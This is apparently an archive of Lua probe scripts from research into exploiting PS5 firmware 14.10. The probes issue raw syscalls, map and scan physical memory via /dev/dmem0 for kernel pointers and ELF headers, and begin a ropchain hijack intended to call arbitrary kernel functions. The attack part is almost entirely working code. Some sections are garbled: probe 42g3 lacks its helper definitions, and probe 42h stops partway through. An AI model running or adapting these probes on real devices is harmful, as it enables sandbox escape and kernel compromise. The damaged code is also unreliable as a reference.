# All Probes — PS5 14.10 Research

Complete archive of every Lua probe written during this research project.
Generated 2026-10-18 (index below). Updated 2026-10-28.

**Total probes: 2682** across **52 phase directories**.

> **Note:** This index covers phases 1-12. Phases 13-52 are not yet indexed here — see the `probes/` directory directly.

## probes/42f2_fast_phys_scan.lua

```lua
-- CRASH_CLASS: SAFE (read-only mmap of physical memory)
-- PROBE 42f2: fast physical memory survey via /dev/dmem0
--
-- 42f timed out doing deep scans. This version ONLY does step 1:
-- mmap 1 page at each offset, read first 2 qwords, check for ELF/FreeBSD, unmap.
-- No string searches, no kernel pointer scans.

print("=== PROBE 42f2: FAST PHYSICAL MEMORY SURVEY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)

local function dev_open(path)
    local name_buf = memory.alloc(256)
    for i = 1, #path do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(path, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #path, 0) end)
    local fd = nil
    pcall(function() fd = sc_open(name_buf, uint64(2), uint64(0)) end)
    return fd and to_num(fd) or -1
end

local dmem_fd = dev_open("/dev/dmem0")
print("dmem0 fd: " .. dmem_fd)
if dmem_fd < 0 then print("FAILED"); return end

local PAGE = 0x4000
local MB = 0x100000

-- Build offset list: focus on likely kernel addresses
local offsets = {}
-- 0 to 4MB in 256KB steps
for i = 0, 15 do offsets[#offsets + 1] = i * 256 * 1024 end
-- 4MB to 64MB in 2MB steps
for i = 2, 32 do offsets[#offsets + 1] = i * 2 * MB end
-- 64MB to 512MB in 16MB steps
for i = 4, 32 do offsets[#offsets + 1] = i * 16 * MB end
-- 512MB to 4GB in 256MB steps
for i = 2, 15 do offsets[#offsets + 1] = i * 256 * MB end

print("scanning " .. #offsets .. " offsets...")
print("")

local hits = 0

for _, phys_off in ipairs(offsets) do
    local off_hi = math.floor(phys_off / 0x100000000)
    local off_lo = phys_off % 0x100000000
    local off_u64 = uint64(string.format("0x%X%08X", off_hi, off_lo))

    local addr = nil
    local ok = pcall(function()
        addr = sc_mmap(uint64(0), uint64(PAGE), uint64(1),
            uint64(1), uint64(dmem_fd), off_u64)
    end)

    if ok and addr then
        local _, ah, al = qw_hex(addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            local d0 = safe_rd(addr)
            local d4 = safe_rd(addr + 4)

            if d0 ~= nil and (d0 ~= 0 or (d4 and d4 ~= 0)) then
                hits = hits + 1
                local tag = ""
                if d0 == 0x464C457F then tag = " *** ELF ***" end

                print(string.format("0x%X%08X: %08X_%08X%s",
                    off_hi, off_lo, d4 or 0, d0, tag))

                -- If ELF found, dump header
                if d0 == 0x464C457F then
                    for off = 8, 0x38, 8 do
                        local q = safe_rq(addr + off)
                        if q then
                            print(string.format("  +0x%02X: %s", off, qw_hex(q)))
                        end
                    end
                end
            end

            pcall(function() sc_munmap(addr, uint64(PAGE)) end)
        end
    end
end

print("")
print("non-zero: " .. hits)

pcall(function() sc_close(uint64(dmem_fd)) end)
print("=== PROBE 42f2 COMPLETE ===")
```

## probes/42g2_high_phys_decode.lua

```lua
-- CRASH_CLASS: SAFE (read-only mmap)
-- PROBE 42g2: high physical addresses + phys 0 decode
--
-- 42g found 3577 nonzero qwords at phys 0, zero kernel pointers.
-- Bug in step 2 (missing MB var). This probe:
-- 1. Scans 4GB-16GB for any accessible data
-- 2. Decodes what's at phys 0 (hardware regs? page tables?)
-- 3. Tries kenv syscall (573) for kernel environment strings

print("=== PROBE 42g2: HIGH PHYS + DECODE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

local function dev_open(path)
    local name_buf = memory.alloc(256)
    for i = 1, #path do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(path, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #path, 0) end)
    local fd = nil
    pcall(function() fd = sc_open(name_buf, uint64(2), uint64(0)) end)
    return fd and to_num(fd) or -1
end

--------------------------------------------------------------------
-- STEP 1: kenv syscall — reads kernel environment variables
-- These often contain boot parameters that reveal memory layout
--------------------------------------------------------------------
print("--- STEP 1: KENV (syscall 390) ---")

local sc_kenv = make_syscall(390)
local kenv_buf = memory.alloc(0x2000)
local kenv_len = memory.alloc(8)

-- KENV_DUMP = 0, KENV_GET = 1
-- kenv(KENV_DUMP, NULL, buf, buflen) dumps all env vars
safe_wq(kenv_len, uint64(0x2000))
local ret = nil
local ok = pcall(function()
    ret = sc_kenv(uint64(0), uint64(0), kenv_buf, kenv_len)
end)
local ret_n = ret and to_num(ret) or -1
print("kenv dump: ret=" .. ret_n)

if ret_n >= 0 then
    -- Read strings from buffer
    local pos = 0
    local count = 0
    local max_read = math.min(ret_n, 0x1000)
    while pos < max_read and count < 30 do
        local s = ""
        while pos < max_read do
            local b = safe_rb(kenv_buf + pos)
            pos = pos + 1
            if not b or b == 0 then break end
            if b >= 32 and b < 127 then
                s = s .. string.char(b)
            end
        end
        if #s > 0 then
            count = count + 1
            print("  " .. s)
        end
    end
    print("entries: " .. count)
else
    print("kenv blocked")
end
print("")

--------------------------------------------------------------------
-- STEP 2: High physical addresses (4GB-16GB)
--------------------------------------------------------------------
print("--- STEP 2: HIGH PHYSICAL ADDRESSES ---")

local dmem_fd = dev_open("/dev/dmem0")
print("dmem0 fd: " .. dmem_fd)

if dmem_fd >= 0 then
    -- 4GB to 16GB in 512MB steps
    local high_addrs = {}
    for i = 0, 23 do
        local gb = 4 + i * 0.5
        local total_bytes_hi = math.floor(gb * 4)  -- in units of 0x40000000
        local phys_hi = math.floor(total_bytes_hi / 4)
        local phys_lo = (total_bytes_hi % 4) * 0x40000000
        high_addrs[#high_addrs + 1] = {
            hi = phys_hi, lo = phys_lo,
            label = string.format("%.1fGB", gb)
        }
    end

    for _, ha in ipairs(high_addrs) do
        local off_u64 = uint64(string.format("0x%X%08X", ha.hi, ha.lo))
        local addr = nil
        local map_ok = pcall(function()
            addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
                uint64(1), uint64(dmem_fd), off_u64)
        end)
        if map_ok and addr then
            local _, ah, al = qw_hex(addr)
            if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
                local d0 = safe_rd(addr)
                local d4 = safe_rd(addr + 4)
                if d0 ~= nil and (d0 ~= 0 or (d4 and d4 ~= 0)) then
                    local tag = ""
                    if d0 == 0x464C457F then tag = " *** ELF ***" end
                    local q = safe_rq(addr)
                    if q then
                        local _, qh, _ = qw_hex(q)
                        if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then
                            tag = tag .. " KPTR!"
                        end
                    end
                    print(string.format("  %s: %08X_%08X%s",
                        ha.label, d4 or 0, d0, tag))
                end
                pcall(function() sc_munmap(addr, uint64(0x4000)) end)
            end
        end
    end

    print("")

    --------------------------------------------------------------------
    -- STEP 3: Decode phys 0 structure
    -- Dump every 0x100-byte block that has non-zero data
    --------------------------------------------------------------------
    print("--- STEP 3: PHYS 0 STRUCTURE ---")

    local addr = nil
    pcall(function()
        addr = sc_mmap(uint64(0), uint64(0x40000), uint64(1),
            uint64(1), uint64(dmem_fd), uint64(0))
    end)

    if addr then
        local _, ah, al = qw_hex(addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            -- First 64 bytes decoded
            print("phys 0x0 first 64 bytes:")
            for off = 0, 0x38, 8 do
                local q = safe_rq(addr + off)
                if q then
                    local hex, qh, ql = qw_hex(q)
                    local tag = ""
                    -- Bit patterns
                    if qh == 0x80000000 then tag = " (bit63 + low32)" end
                    if ql == 0 and qh == 0 then tag = " zero" end
                    print(string.format("  +0x%02X: %s%s", off, hex, tag))
                end
            end

            -- Find regions with dense non-zero data
            print("")
            print("non-zero density (per 256-byte block, first 256KB):")
            for blk = 0, 255 do
                local base = blk * 0x100
                local nz = 0
                for off = 0, 0xF8, 8 do
                    local q = safe_rq(addr + base + off)
                    if q then
                        local _, qh, ql = qw_hex(q)
                        if qh > 0 or ql > 0 then nz = nz + 1 end
                    end
                end
                if nz > 0 then
                    -- Show first qword of this block
                    local first_q = safe_rq(addr + base)
                    print(string.format("  +0x%05X: %d/32 nz, first=%s",
                        base, nz, first_q and qw_hex(first_q) or "?"))
                end
            end

            pcall(function() sc_munmap(addr, uint64(0x40000)) end)
        end
    end

    pcall(function() sc_close(uint64(dmem_fd)) end)
end

print("")
print("=== PROBE 42g2 COMPLETE ===")
```

```lua
-- CRASH_CLASS: SAFE (read-only mmap)
-- PROBE 42g3: high physical addresses + phys 0 decode
-- kenv (42g2) killed the process. Skip it. Just scan high phys.

print("=== PROBE 42g3: HIGH PHYS + PHYS0 DECODE ===")

        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)

end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_getpid = make_syscall(20)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

local function dev_open(path)
    local name_buf = memory.alloc(256)
    for i = 1, #path do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(path, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #path, 0) end)
    local fd = nil
    pcall(function() fd = sc_open(name_buf, uint64(2), uint64(0)) end)
    return fd and to_num(fd) or -1
end

local dmem_fd = dev_open("/dev/dmem0")
print("dmem0 fd: " .. dmem_fd)
if dmem_fd < 0 then print("FAILED"); return end

--------------------------------------------------------------------
-- STEP 1: High physical addresses (4GB to 16GB, 512MB steps)
--------------------------------------------------------------------
print("")
print("--- STEP 1: HIGH PHYSICAL ADDRESSES ---")

-- Build offsets manually to avoid float issues
-- 4GB = 0x1_00000000, 4.5GB = 0x1_20000000, etc.
local high_offsets = {
    {1, 0x00000000, "4.0GB"},
    {1, 0x20000000, "4.5GB"},
    {1, 0x40000000, "5.0GB"},
    {1, 0x60000000, "5.5GB"},
    {1, 0x80000000, "6.0GB"},
    {1, 0xA0000000, "6.5GB"},
    {1, 0xC0000000, "7.0GB"},
    {1, 0xE0000000, "7.5GB"},
    {2, 0x00000000, "8.0GB"},
    {2, 0x40000000, "9.0GB"},
    {2, 0x80000000, "10GB"},
    {2, 0xC0000000, "11GB"},
    {3, 0x00000000, "12GB"},
    {3, 0x40000000, "13GB"},
    {3, 0x80000000, "14GB"},
    {3, 0xC0000000, "15GB"},
}

for _, ha in ipairs(high_offsets) do
    local off_u64 = uint64(string.format("0x%X%08X", ha[1], ha[2]))
    local addr = nil
    local map_ok = pcall(function()
        addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(dmem_fd), off_u64)
    end)
    if map_ok and addr then
        local _, ah, al = qw_hex(addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            local d0 = safe_rd(addr)
            local d4 = safe_rd(addr + 4)
            local tag = ""
            if d0 == 0x464C457F then tag = " *** ELF ***" end
            if d0 ~= nil and (d0 ~= 0 or (d4 and d4 ~= 0)) then
                local q = safe_rq(addr)
                if q then
                    local _, qh, _ = qw_hex(q)
                    if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then
                        tag = tag .. " KPTR!"
                    end
                end
                print(string.format("  %s: %08X_%08X%s", ha[3], d4 or 0, d0, tag))
            else
                print(string.format("  %s: zeros", ha[3]))
            end
            pcall(function() sc_munmap(addr, uint64(0x4000)) end)
        else
            print(string.format("  %s: MAP_FAILED", ha[3]))
        end
    else
        print(string.format("  %s: mmap error", ha[3]))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: Phys 0 decode — first 64 bytes + density map
--------------------------------------------------------------------
print("--- STEP 2: PHYS 0 DECODE ---")

local addr = nil
pcall(function()
    addr = sc_mmap(uint64(0), uint64(0x40000), uint64(1),
        uint64(1), uint64(dmem_fd), uint64(0))
end)

if addr then
    local _, ah, al = qw_hex(addr)
    if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
        print("first 128 bytes:")
        for off = 0, 0x78, 8 do
            local q = safe_rq(addr + off)
            if q then
                print(string.format("  +0x%02X: %s", off, qw_hex(q)))
            end
        end
        print("")

        -- Find non-zero 256-byte blocks in first 256KB
        print("non-zero blocks (256B each):")
        local total_nz_blocks = 0
        for blk = 0, 1023 do
            local base = blk * 0x100
            local nz = 0
            for off = 0, 0xF8, 8 do
                local q = safe_rq(addr + base + off)
                if q then
                    local _, qh, ql = qw_hex(q)
                    if qh > 0 or ql > 0 then nz = nz + 1 end
                end
            end
            if nz > 0 then
                total_nz_blocks = total_nz_blocks + 1
                if total_nz_blocks <= 20 then
                    local fq = safe_rq(addr + base)
                    print(string.format("  +0x%05X: %d/32 nz first=%s",
                        base, nz, fq and qw_hex(fq) or "?"))
                end
            end
        end
        print("total non-zero blocks: " .. total_nz_blocks .. " / 1024")

        pcall(function() sc_munmap(addr, uint64(0x40000)) end)
    end
end

pcall(function() sc_close(uint64(dmem_fd)) end)
print("")
print("=== PROBE 42g3 COMPLETE ===")
```

```lua
-- CRASH_CLASS: SAFE
-- PROBE 42g4: minimal high phys test

print("=== PROBE 42g4 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)

local function dev_open(path)
    local name_buf = memory.alloc(256)
    for i = 1, #path do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(path, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #path, 0) end)
    local fd = nil
    pcall(function() fd = sc_open(name_buf, uint64(2), uint64(0)) end)
    return fd and to_num(fd) or -1
end

local dmem_fd = dev_open("/dev/dmem0")
print("fd: " .. dmem_fd)

-- Test: just try one high address
print("test 4GB...")
local addr = nil
local ok = pcall(function()
    addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(dmem_fd),
        uint64("0x100000000"))
end)
print("mmap ok: " .. tostring(ok))
if ok and addr then
    local hex = qw_hex(addr)
    print("addr: " .. hex)
    local _, ah, al = qw_hex(addr)
    print("hi: " .. ah .. " lo: " .. al)
    if ah == 0xFFFFFFFF and al == 0xFFFFFFFF then
        print("MAP_FAILED")
    else
        local d = safe_rd(addr)
        print("data: " .. (d or -1))
        pcall(function() sc_munmap(addr, uint64(0x4000)) end)
    end
end

print("test 4.5GB...")
ok = pcall(function()
    addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(dmem_fd),
        uint64("0x120000000"))
end)
print("mmap ok: " .. tostring(ok))
if ok and addr then
    local hex = qw_hex(addr)
    print("addr: " .. hex)
end

-- Now the REAL question: try the PS5's GDDR6 physical range
-- PS5 has 16GB GDDR6. Addresses might start at a specific base.
-- Try some PS5-specific ranges
print("")
print("--- PS5-SPECIFIC RANGES ---")

local test_offsets = {
    "0x0",          -- we know this works
    "0x80000000",   -- 2GB
    "0xF8000000",   -- ~4GB minus some (PCI hole?)
    "0xFC000000",   -- near 4GB
    "0x100000000",  -- 4GB
    "0x200000000",  -- 8GB
    "0x300000000",  -- 12GB
    "0x380000000",  -- 14GB
}

for _, off_str in ipairs(test_offsets) do
    local test_addr = nil
    local test_ok = pcall(function()
        test_addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(dmem_fd), uint64(off_str))
    end)
    local result = "error"
    if test_ok and test_addr then
        local _, ah, al = qw_hex(test_addr)
        if ah == 0xFFFFFFFF and al == 0xFFFFFFFF then
            result = "MAP_FAILED"
        else
            local d = safe_rd(test_addr)
            if d ~= nil then
                result = string.format("data=0x%08X", d)
            else
                result = "mapped but unreadable"
            end
            pcall(function() sc_munmap(test_addr, uint64(0x4000)) end)
        end
    end
    print(string.format("  %s: %s", off_str, result))
end

pcall(function() sc_close(uint64(dmem_fd)) end)
print("")
print("=== PROBE 42g4 COMPLETE ===")
```

## probes/42g_rop_kptr_leak.lua

```lua
-- CRASH_CLASS: MODERATE (ropchain manipulation + syscall redirection)
-- PROBE 42g: use ropchain hijack to leak kernel pointers
--
-- Strategy: The loader's ropchain executes syscalls by writing args
-- into heap slots, then pivoting to a call stub. We can:
-- 1. Find the ropchain (same as 41z)
-- 2. Locate the argument slots and fn_addr
-- 3. Set up a sysctl call that reads kernel process info
--    (kern.proc.all or kern.proc.pid with our PID)
-- 4. The key: we bypass the Lua-level syscall.resolve() which may
--    be where sandbox filtering happens
--
-- Actually, 42a already showed that raw make_syscall(202) works for
-- sysctl but returns scrubbed data. The sandbox is in the kernel.
--
-- NEW APPROACH: Use the ropchain to call functions OTHER than syscall:
-- - Call dlsym-equivalent to resolve internal libkernel functions
-- - Call pipe(2) and then read the kernel pipe struct via /proc or sysctl
-- - Or: call mmap with dmem0 fd at SPECIFIC physical offsets where
--   kernel data structures live
--
-- SIMPLEST: the data at phys 0 (0x80000000C0012800) looks like a
-- pointer. Map more pages around it and decode what structure it is.
-- If it's a page table or descriptor table, we can find kernel VA.
--
-- APPROACH: Map a large region starting from phys 0 and scan for
-- kernel virtual address patterns (0xFFFF8xxx_xxxxxxxx).

print("=== PROBE 42g: PHYSICAL MEMORY DEEP SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_getpid = make_syscall(20)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

local function dev_open(path)
    local name_buf = memory.alloc(256)
    for i = 1, #path do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(path, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #path, 0) end)
    local fd = nil
    pcall(function() fd = sc_open(name_buf, uint64(2), uint64(0)) end)
    return fd and to_num(fd) or -1
end

local dmem_fd = dev_open("/dev/dmem0")
print("dmem0 fd: " .. dmem_fd)
if dmem_fd < 0 then print("FAILED"); return end

--------------------------------------------------------------------
-- STEP 1: Map a large region at phys 0 and scan for kernel ptrs
-- 42f2 showed phys 0 has data. Map 1MB and look for patterns.
--------------------------------------------------------------------
print("")
print("--- STEP 1: DEEP SCAN PHYS 0 ---")

local scan_sizes = {0x4000, 0x10000, 0x40000, 0x100000}

for _, sz in ipairs(scan_sizes) do
    local addr = nil
    local ok = pcall(function()
        addr = sc_mmap(uint64(0), uint64(sz), uint64(1),
            uint64(1), uint64(dmem_fd), uint64(0))
    end)

    if ok and addr then
        local _, ah, al = qw_hex(addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            -- Count kernel pointers and interesting values
            local kptrs = 0
            local nonzero = 0
            local first_kptr = nil
            local elf_found = false

            for off = 0, sz - 8, 8 do
                local q = safe_rq(addr + off)
                if q then
                    local _, qh, ql = qw_hex(q)
                    if qh > 0 or ql > 0 then
                        nonzero = nonzero + 1
                    end
                    if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then
                        kptrs = kptrs + 1
                        if kptrs <= 5 then
                            print(string.format("  +0x%05X: %s KPTR", off, qw_hex(q)))
                        end
                        if not first_kptr then first_kptr = qw_hex(q) end
                    end
                    -- Check for ELF
                    if off % 4 == 0 then
                        local d = safe_rd(addr + off)
                        if d == 0x464C457F then
                            print(string.format("  +0x%05X: ELF HEADER ***", off))
                            elf_found = true
                        end
                    end
                end
            end

            print(string.format("  mmap(sz=0x%X): nonzero=%d kptrs=%d%s",
                sz, nonzero, kptrs, elf_found and " ELF!" or ""))

            pcall(function() sc_munmap(addr, uint64(sz)) end)

            if kptrs > 0 then break end
        else
            print(string.format("  mmap(sz=0x%X): MAP_FAILED", sz))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: Try negative/high physical offsets
-- On x86, MMIO and DRAM might be at high physical addresses.
-- Try above 4GB where DRAM typically resides on modern systems.
--------------------------------------------------------------------
print("--- STEP 2: HIGH PHYSICAL ADDRESSES ---")

local MB = 0x100000
local high_offsets = {}
-- 4GB to 8GB in 256MB steps
for i = 0, 15 do
    high_offsets[#high_offsets + 1] = {
        hi = 1 + math.floor(i * 256 * MB / 0x100000000),
        lo = (i * 256 * MB) % 0x100000000,
        label = string.format("%dGB+%dMB", 4 + math.floor(i*256/1024), (i*256)%1024)
    }
end
-- Also try specific addresses: 0x100000000 (4GB), 0x180000000 (6GB)
-- These are where DRAM often starts on systems with >4GB

-- 2026-10-17: per-offset markers + mmap-return validation (42g3/42g4 outputs are incomplete; rerun readiness).
for i, off in ipairs(high_offsets) do
    print(string.format("  [%d/16] %s (offset 0x%X_%08X): mmap...", i, off.label, off.hi, off.lo))
    local off_u64 = uint64(string.format("0x%X%08X", off.hi, off.lo))
    local addr = nil
    local ok = pcall(function()
        addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(dmem_fd), off_u64)
    end)

    if not ok or not addr then
        print(string.format("  [%d/16] MMAP-FAILED (call did not return an address)", i))
    else
        local addr_hex, ah, al = qw_hex(addr)
        if (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) or ah >= 0xFFFF0000 then
            print(string.format("  [%d/16] MMAP-INVALID (addr=%s) — skipping data read", i, addr_hex))
        else
            local d0 = safe_rd(addr)
            local d4 = safe_rd(addr + 4)
            local nonzero = (d0 ~= nil and (d0 ~= 0 or (d4 and d4 ~= 0))) and 1 or 0
            local kptrs = 0
            local tag = ""
            if d0 == 0x464C457F then tag = " ELF" end
            local q = safe_rq(addr)
            if q then
                local _, qh, _ = qw_hex(q)
                if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then
                    kptrs = 1
                    tag = tag .. " KPTR-candidate"
                end
            end
            if nonzero == 0 then
                print(string.format("  [%d/16] %s: zeros", i, off.label))
            else
                print(string.format("  [%d/16] %s: nonzero=%d kptrs=%d%s data=%08X_%08X",
                    i, off.label, nonzero, kptrs, tag, d4 or 0, d0 or 0))
            end
            pcall(function() sc_munmap(addr, uint64(0x4000)) end)
        end
    end
end
print("  --- step 2 offset scan done ---")
print("")

--------------------------------------------------------------------
-- STEP 3: Decode what's at physical 0
-- The value 0x80000000C0012800 at phys 0 is interesting:
-- Bit 63 set = likely a present page table entry or hardware reg
-- 0xC0012800 looks like a physical address (PCI MMIO range?)
-- Dump the first 256 bytes as both qwords and scan for patterns
--------------------------------------------------------------------
print("--- STEP 3: PHYS 0 DECODE ---")

local addr = nil
pcall(function()
    addr = sc_mmap(uint64(0), uint64(0x4000), uint64(1),
        uint64(1), uint64(dmem_fd), uint64(0))
end)

if addr then
    local _, ah, al = qw_hex(addr)
    if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
        print("first 256 bytes at phys 0:")
        for off = 0, 0xF8, 8 do
            local q = safe_rq(addr + off)
            if q then
                local hex, qh, ql = qw_hex(q)
                local tag = ""
                if qh >= 0xFFFF8000 and qh < 0xFFFFFFF0 then tag = " KPTR" end
                if qh == 0x80000000 or qh == 0x80000001 then tag = " PTE?" end
                if ql == 0 and qh == 0 then tag = " zero" end
                print(string.format("  +0x%02X: %s%s", off, hex, tag))
            end
        end
        pcall(function() sc_munmap(addr, uint64(0x4000)) end)
    end
end
print("")

--------------------------------------------------------------------
-- STEP 4: Try mmap with PROT_READ|PROT_WRITE (3) instead of
-- just PROT_READ (1) — and try MAP_SHARED (1) vs MAP_PRIVATE (2)
-- Also try different dmem ioctls to allocate memory first
--------------------------------------------------------------------
print("--- STEP 4: ALTERNATE MMAP FLAGS ---")

local flag_combos = {
    {prot=1, flags=1, label="RD+SHARED"},
    {prot=1, flags=2, label="RD+PRIVATE"},
    {prot=3, flags=1, label="RW+SHARED"},
    {prot=3, flags=2, label="RW+PRIVATE"},
    {prot=3, flags=0x1002, label="RW+SHARED+ANON"},
}

for _, fc in ipairs(flag_combos) do
    local test_addr = nil
    local ok = pcall(function()
        test_addr = sc_mmap(uint64(0), uint64(0x4000), uint64(fc.prot),
            uint64(fc.flags), uint64(dmem_fd), uint64(0x4000))
    end)
    if ok and test_addr then
        local _, ah, al = qw_hex(test_addr)
        if not (ah == 0xFFFFFFFF and al == 0xFFFFFFFF) then
            local d0 = safe_rd(test_addr)
            print(string.format("  %s at off 0x4000: mapped! data=0x%08X",
                fc.label, d0 or 0))
            pcall(function() sc_munmap(test_addr, uint64(0x4000)) end)
        else
            print(string.format("  %s at off 0x4000: MAP_FAILED", fc.label))
        end
    else
        print(string.format("  %s at off 0x4000: error", fc.label))
    end
end

pcall(function() sc_close(uint64(dmem_fd)) end)

print("")
print("=== PROBE 42g COMPLETE ===")
```

```lua
-- CRASH_CLASS: HIGH (ropchain manipulation — may crash process)
-- PROBE 42h: actual ropchain exploit for kernel pointer leak
--
-- From 41z we know:
-- - The loader's ropchain is at a known heap offset from GPU mmap
-- - fn_addr (the function pointer the chain calls) is writable
-- - All 13 argument slots are writable
-- - After write/restore, syscalls still work
--
-- STRATEGY: The ropchain calls libkernel's syscall stub. The stub is at
-- a fixed offset in libkernel. We can:
-- 1. Find the ropchain (same technique as 41z)
-- 2. Save the original chain state
-- 3. Modify the ARGUMENT SLOTS to pass different args to the SAME function
-- 4. Trigger a syscall — the chain runs with OUR args
-- 5. Read the result
--
-- Specifically: sysctl with kern.proc.all (which might have less scrubbing
-- than kern.proc.pid), or try kern.file which lists all open file descriptors
-- across processes.
--
-- EVEN BETTER: modify fn_addr to point to a different function entirely.
-- If we point it at the address of `sceKernelGetDirectMemorySize` or similar,
-- we can call arbitrary PS5 kernel functions.

print("=== PROBE 42h: ROPCHAIN EXPLOIT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_getpid = make_syscall(20)
local sc_dynlib_get_info = make_syscall(593)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

--------------------------------------------------------------------
